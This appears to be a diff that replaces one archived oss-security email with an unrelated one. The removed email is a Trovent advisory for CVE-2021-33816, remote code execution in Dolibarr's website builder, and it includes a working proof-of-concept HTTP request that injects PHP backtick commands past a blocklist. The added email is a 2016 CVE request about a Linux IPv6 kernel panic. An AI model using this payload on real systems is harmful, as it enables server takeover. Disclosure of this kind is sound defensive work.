@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["5842" "Wednesday" "10" "November" "2021" "11:40:41" "+0000" "Stefan Pietsch" "s.pietsch@trovent.io" nil "196" "[oss-security] Trovent Security Advisory 2106-01 / CVE-2021-33816: Authenticated remote code execution in Dolibarr ERP & CRM" nil nil nil "11" nil nil (number mark "U       s.pietsch@tr Nov 10  196/5842  " thread-indent "\"[oss-security] Trovent Security Advisory 2106-01 / CVE-2021-33816: Authenticated remote code execution in Dolibarr ERP & CRM\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Trovent Security Advisory 2106-01 / CVE-2021-33816: Authenticated remote code execution in Dolibarr ERP & CRM" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2330" "Thursday" "8" "December" "2016" "16:21:26" "+0100" "Florian Pritz" "bluewind@xinu.at" "<753535c2-d3b4-ffdf-dfbf-03a889c00659@xinu.at>" "62" "[oss-security] CVE request: Linux panic on fragemented IPv6 traffic (icmp6_send)" nil nil nil "12" "2016120815:21:26" "[oss-security] CVE request: Linux panic on fragemented IPv6 traffic (icmp6_send)" (number mark "U       bluewind@xin Dec  8   62/2330  " thread-indent "\"[oss-security] CVE request: Linux panic on fragemented IPv6 traffic (icmp6_send)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 1993 invoked by uid 550); 10 Nov 2021 11:44:18 -0000
+Received: (qmail 3172 invoked by uid 550); 8 Dec 2016 15:22:21 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,218 +12,94 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 32725 invoked from network); 10 Nov 2021 11:40:59 -0000
-Date: Wed, 10 Nov 2021 11:40:41 +0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=trovent.io;
-	s=protonmail; t=1636544443;
-	bh=+0R3/Pxm00m19je2Os8SqbUhDRWFG90tl3ceZEawX9s=;
-	h=Date:To:From:Reply-To:Subject:From;
-	b=E7Vb0cHTADwyXsZSTNlfCB+Ygmhpn2U7a7N3+cgcOIq4We/f03x5VJXC89H8EEwsy
-	 HzATHiS5K8Qru+iKITwFQvj70C4/sodwmSxVMcKQUTpqM5N1T2Ix0VFvVMCYQNfVcG
-	 EggzWNmIllqgmzk5u2PvOfZIHNEFf1fy2tdPM7PlTrTfgtULgfXF+jwybb0XNXiW5Q
-	 lzFL0s1x6AED/nUoIlsGF+JLA/jSTQ0AIYTC0gyaZMtOV/ewF52eFTXOhYAAwWhZXS
-	 qAhhLRtiKadOoXMlHqYLiu/5QHwrdCMfDdlSVTNCFHW1hpiXKWfw1elTKBYeN+I/Va
-	 pPRax6B09XhSQ==
-To: Packet Storm <submissions@packetstormsecurity.com>, Full Disclosure <fulldisclosure@seclists.org>, oss-security <oss-security@lists.openwall.com>
-From: Stefan Pietsch <s.pietsch@trovent.io>
-Message-ID: <A8hHfMk2fHN6wpAjOxqa33utuQ8_U_miKty_tYxSX0aucRF-238gdc8_z60udBllsgJsAPVb1X6fgZbSSklHa_WHGrwoQ9gzGSmzEEza0Zk=@trovent.io>
+Received: (qmail 1725 invoked from network); 8 Dec 2016 15:21:40 -0000
+X-Spam-Virus: No
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=xinu.at; s=main;
+	t=1481210487; bh=+13rgG2aSYi5wOdGc7jtEcE8KU+g4VHLijnZDmazCZo=;
+	h=From:Subject:To:Date;
+	b=qzpfCOg/0aSy+z6UKmC+R4k6253y7ejX/dGUpd9fSR/H5kwLdzaQPQe9Rgg+lPU+l
+	 /I3m0hCcFDgfZVhTowwGfyU65L9HA8I0So2ixDbxIOpRWrJ0f/XG4bQV9AC2nIVd/w
+	 G2EuouUUDEPA+nS7MKTQ4OvuwxuPbW6MOjLDFdfWZchiqcLa03a3iSjBooU5dWPKB+
+	 kYuvDfQDBGA0Fp6ng4dqd7hz81LPZNyQpp9aoa6WudhhJSXzmk98VD+MBco9Tx9vYQ
+	 TUfAK8XYwUu4R0IvMFwc7yGvfP5tMRbZ2c4mcqV2mRNWzjED3Sd6MpEtvoZLEOscfV
+	 Q8gg7WXy3zZXK+gdDWarrBmXMSaY7ilzBYto6ynymNC+1E4rctO+LxXMhEI+LjPKWC
+	 rXLuFLfcYZhAuqrpvADA9N7y69dipyVqe7M/qrDL87Nt+gLI/UqLBGjwbi852GwcWd
+	 kDB3kmY1vAzk7Puh69MNqY6f2GTcebaIRibxI2lFYnJSEpb3cfMDg3CW1xvaMVQ4j4
+	 0/OfuBkIhvBA6lPly/VEH+17JeUNWc5sjU0R8aFOA4QMOSp18V4mG5T11kN8ZAIk6N
+	 Y4eHKI5LUClZ0wagInH9pevnFeShIgH+4DN3wfhPk85jJcd2eV+bONK7IIH9WJZDbo
+	 Og2c0FvTGO2yd6pmiek9RWtU=
+From: Florian Pritz <bluewind@xinu.at>
+To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>,
+ cve-assign@mitre.org
+Message-ID: <753535c2-d3b4-ffdf-dfbf-03a889c00659@xinu.at>
+Date: Thu, 8 Dec 2016 16:21:26 +0100
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
+ Thunderbird/45.5.1
 MIME-Version: 1.0
-Content-Type: multipart/signed; protocol="application/pgp-signature"; micalg=pgp-sha256; boundary="------1399496223042e777c4ad49e1593e5c920f73d4368df942df3f30bfa771350e8"; charset=utf-8
-Subject: [oss-security] Trovent Security Advisory 2106-01 / CVE-2021-33816: Authenticated remote code execution in Dolibarr ERP & CRM
+Content-Type: multipart/signed; micalg=pgp-sha512;
+ protocol="application/pgp-signature";
+ boundary="lSXRLg31iW6m8KCPpxxApVOmg1MIJOEXd"
+Subject: [oss-security] CVE request: Linux panic on fragemented IPv6 traffic (icmp6_send)
 
---------1399496223042e777c4ad49e1593e5c920f73d4368df942df3f30bfa771350e8
-Content-Type: multipart/mixed;boundary=---------------------3f654895839f51fb836ee27e7688d2f7
+--lSXRLg31iW6m8KCPpxxApVOmg1MIJOEXd
+Content-Type: multipart/mixed; boundary="IipwvqUIGpx29u0EGRGprvtrnKpdDEMCP";
+ protected-headers="v1"
+From: Florian Pritz <bluewind@xinu.at>
+To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>,
+ cve-assign@mitre.org
+Message-ID: <753535c2-d3b4-ffdf-dfbf-03a889c00659@xinu.at>
+Subject: CVE request: Linux panic on fragemented IPv6 traffic (icmp6_send)
 
------------------------3f654895839f51fb836ee27e7688d2f7
+--IipwvqUIGpx29u0EGRGprvtrnKpdDEMCP
+Content-Type: text/plain; charset=utf-8
 Content-Transfer-Encoding: quoted-printable
-Content-Type: text/plain;charset=utf-8
 
-# Trovent Security Advisory 2106-01 #
-#####################################
+Hi,
 
+The linux kernel contains a bug where a fragmented IPv6 packet causes a
+panic after a timeout (seems to be roughly 60 seconds). This can be
+triggered remotely via the internet and results in a DoS (kernel panic).
 
-Authenticated remote code execution in Dolibarr ERP & CRM
-#########################################################
+Details: https://bugzilla.kernel.org/show_bug.cgi?id=3D189851
 
+This is fixed by commit 79dc7e3f1cd323be4c81aa1a94faa1b3ed987fb2
+Author: David Ahern <dsa@cumulusnetworks.com>
+Date:   Sun Nov 27 18:52:53 2016 -0800
 
-Overview
-########
+    net: handle no dst on skb in icmp6_send
 
-Advisory ID: TRSA-2106-01
-Advisory version: 1.0
-Advisory status: Public
-Advisory URL: https://trovent.io/security-advisory-2106-01
-Affected product: Dolibarr ERP & CRM
-Tested versions: Dolibarr 13.0.2
-Vendor: Dolibarr foundation, https://www.dolibarr.org
-Credits: Trovent Security GmbH, Nick Decker
+Reference:
+https://git.kernel.org/cgit/linux/kernel/git/stable/linux-stable.git/commit=
+/?id=3D79dc7e3f1cd323be4c81aa1a94faa1b3ed987fb2
 
+Can a CVE be assigned to this issue?
 
-Detailed description
-####################
-
-During our security research Trovent Security discovered
-that the Dolibarr application on default settings allows remote code execut=
-ion
-in the website builder module. When trying to use statements like "exec()",
-"system()" or "shell_exec()" the application blocks them correctly.
-But we were able to execute code using "``" (backticks) which is the same as
-"shell_exec()" or "echo fread(popen('/bin/ls /', 'r'), 4096);".
-
-Severity: Critical
-CVSS Score: 9.1 (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H)
-CWE ID: CWE-94
-CVE ID: CVE-2021-33816
+Florian
 
 
-Proof of concept
-################
+--IipwvqUIGpx29u0EGRGprvtrnKpdDEMCP--
 
-This is the HTTP request that creates a website with the malicious code:
-
-REQUEST:
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
-~~~~~
-
-
-POST /website/index.php HTTP/1.1
-Host: 10.11.9.80
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox=
-/78.0
-Accept: text/html,application/xhtml+xml,application/xml;q=3D0.9,image/webp,=
-*/*;q=3D0.8
-Accept-Language: en-US,en;q=3D0.5
-Accept-Encoding: gzip, deflate
-Content-Type: multipart/form-data; boundary=3D---------------------------24=
-3035796342141148842632336365
-Content-Length: 937
-Origin: http://10.11.9.80
-Connection: close
-Referer: http://10.11.9.80/website/index.php
-Cookie: DOLSESSID_736206a821984837877b8a6a901910d2=3Dv459clrdeu91pfc20se8s0=
-rg4d; DOLUSERCOOKIE_boxfilter_task=3Dall-securitytest-for-dolibarr
-Upgrade-Insecure-Requests: 1
-
-- -----------------------------243035796342141148842632336365
-Content-Disposition: form-data; name=3D"token"
-
-f8c257168a5ae06fd1aee2ba4c45ebf9
-- -----------------------------243035796342141148842632336365
-Content-Disposition: form-data; name=3D"backtopage"
-
-
-- -----------------------------243035796342141148842632336365
-Content-Disposition: form-data; name=3D"action"
-
-updatesource
-- -----------------------------243035796342141148842632336365
-Content-Disposition: form-data; name=3D"website"
-
-test
-- -----------------------------243035796342141148842632336365
-Content-Disposition: form-data; name=3D"pageid"
-
-1
-- -----------------------------243035796342141148842632336365
-Content-Disposition: form-data; name=3D"update"
-
-Save
-- -----------------------------243035796342141148842632336365
-Content-Disposition: form-data; name=3D"PAGE_CONTENT"
-
-<?php
-echo `uname -a`;
-?>
-- -----------------------------243035796342141148842632336365--
-
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
-~~~~~
-
-
-
-
-CODE:
-
-The website now displays the output of the command:
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
-~~~~~
-
-
-[...]
-<div id=3D"websitecontentundertopmenu" class=3D"websitecontentundertopmenu =
-boostrap-iso">
-<!-- style of website from file -->
-<style scoped=3D"">
-/* Include website CSS file */
-/* CSS content (all pages) */
-body.bodywebsite { margin: 0; font-family: 'Open Sans', sans-serif; }
-.bodywebsite h1 { margin-top: 0; margin-bottom: 0; padding: 10px;}/* Includ=
-e style from the HTML header of page */
-
-</style>
-<div id=3D"divbodywebsite" class=3D"bodywebsite bodywebpage-tsets">
-
-Linux ec9465c86e5e 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x8=
-6_64 GNU/Linux
-
-</div></div>
-[...]
-
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
-~~~~~
-
-
-Solution / Workaround
-#####################
-
-We recommend to disable the 'websites' module in Dolibarr until a fixed ver=
-sion
-is deployed.
-
-Fixed in Dolibarr version 14.0.0, verified by Trovent.
-
-
-History
-#######
-
-2021-06-01: Vulnerability found
-2021-06-02: CVE ID requested
-2021-06-03: CVE ID received
-2021-06-09: Vendor contacted
-2021-06-10: Vendor reported the vulnerability as fixed
-2021-11-08: Add information about fixed version
-2021-11-10: Advisory published
-
------------------------3f654895839f51fb836ee27e7688d2f7--
-
---------1399496223042e777c4ad49e1593e5c920f73d4368df942df3f30bfa771350e8
+--lSXRLg31iW6m8KCPpxxApVOmg1MIJOEXd
 Content-Type: application/pgp-signature; name="signature.asc"
 Content-Description: OpenPGP digital signature
 Content-Disposition: attachment; filename="signature.asc"
 
 -----BEGIN PGP SIGNATURE-----
-Version: ProtonMail
 
-wsFzBAEBCAAGBQJhi6+rACEJEM8er/4ehY63FiEE0wArIZvu5AKY9ZSXzx6v
-/h6Fjrd8lg/9FNkbgDSqKnwOed6n9Lbo0wfj5ku2NPwwGcNBHx1mVthDNU7t
-F5aVTxUqU3N5ZuEYusITW2jaI1PM5ZanbZGlImcVhaMfyR0IudTf0hKeisR9
-TDZqZ2Y3k0vlF78fhvi0oX4rA7+bDNcPrNRdufjmsGwcPFnt3CSAm2/WvphH
-zw2fQcv59DD+k5SrsQqqL7135mRzhZQb4DMSHeJD+6Y/igMQkoAY28ZUpvsp
-yBSbFDX7XntRzhoSmD3JLLJghHuTHG5xB8UyK++KlIj8OHt0ePr3NuS7eVr3
-PyS5bywDn8eezBCGcmMcXNpiYX9dPnkB31d5z7YPaqC0f/tFdoe4zQyuoDpX
-UaTTKeAPsy1iVTA0F1WsVHl7khCEfcdwPDE5RJzwG38AQllI91PvEPqpwkxZ
-waVpAK53Zf2JgYYxqs00s13pQa1z6kD2FZgZkJR8G9KmkUHqOsvJy3ac2ChC
-jD4L4rOSefNPDzuCurM2J17ULUq5TQk8E1GT4SjBEMBy131UOuBucyG+6SWx
-tDpyTzaLmfMj8erNCS87OGnEZdXCJZxT0KHieDb9K7ScstaIOauMHuGMuEvM
-DTIK20x/QhXJTV/BT1pQgaUO9uS7i0Kk3YXzAhhWvKdT5T4Bx427hYgl7dNL
-qiv+QM/We8Ez8syX6wNZxWm/PpxWpru3v3A=
-=0234
+iQJFBAEBCgAvFiEEz6avFeXHQUn8HYwIbRZVwUzhwT4FAlhJenYRHGJsdWV3aW5k
+QHhpbnUuYXQACgkQbRZVwUzhwT6pog//Tw1j06BRphHPmgEZNW8pD70nifS9WlBE
+7dnA3OGpMh/1A4EGEza5ZKyDo5SX8v79pHJqZ1BwrEjuWTVSthOXoUdVOFfgwSf4
+wFMOhMbVEEUe0Yy47BokwiSe5AEa7GBgR/y0kXmMvGCcTK/cYsHqqF0BWyq4caK2
+TmlfDS+HVRP8VVeB0piJCHCuiGSn9hAyapkBARCGC6gw7iwiBxEafxKP56gVXBXo
+/2/nVKTizQbMSTnYga6RRhzjCvs3PSbjLbncoac9WJgHkgpuEcPYGYIQmWL8252L
+iHNkDBiJkchH9X+It//G7okS5gE002VnmQtDafgzoqGYmUa3gDI9UjRDfaASH3Xc
+NdFufTo/i8Ajyxvkp8V5cFyi107XScsBK9nzmXecgLvfOT37wQ0WDUQ+JYeO2eQy
+QtryV6g5VMPAvtCf1sckrrXFcYMitWeRSGLT2B4ftYRQ9GEocbssJPQzwgcY0yRN
+208phWrEgNrk4/TJJF+0Ayeq9yEpL9IlP7Yvl1S0UWTPj23usNUhL95mPu7V9CKF
+rasIVbW6ias85MKF4oJL2B/j55mrJ6AG5L7ALfpygaI3yyeGaIq6DDQS5+93Wd7n
+AjPTfzkJ7lg54rxkrk9mzF1dqKYbLqGR/geM1rRtilFSsOth2ZneBbxhHZOMwslc
+5alQGCyzamE=
+=tVwF
 -----END PGP SIGNATURE-----
 
-
---------1399496223042e777c4ad49e1593e5c920f73d4368df942df3f30bfa771350e8--
-
+--lSXRLg31iW6m8KCPpxxApVOmg1MIJOEXd--
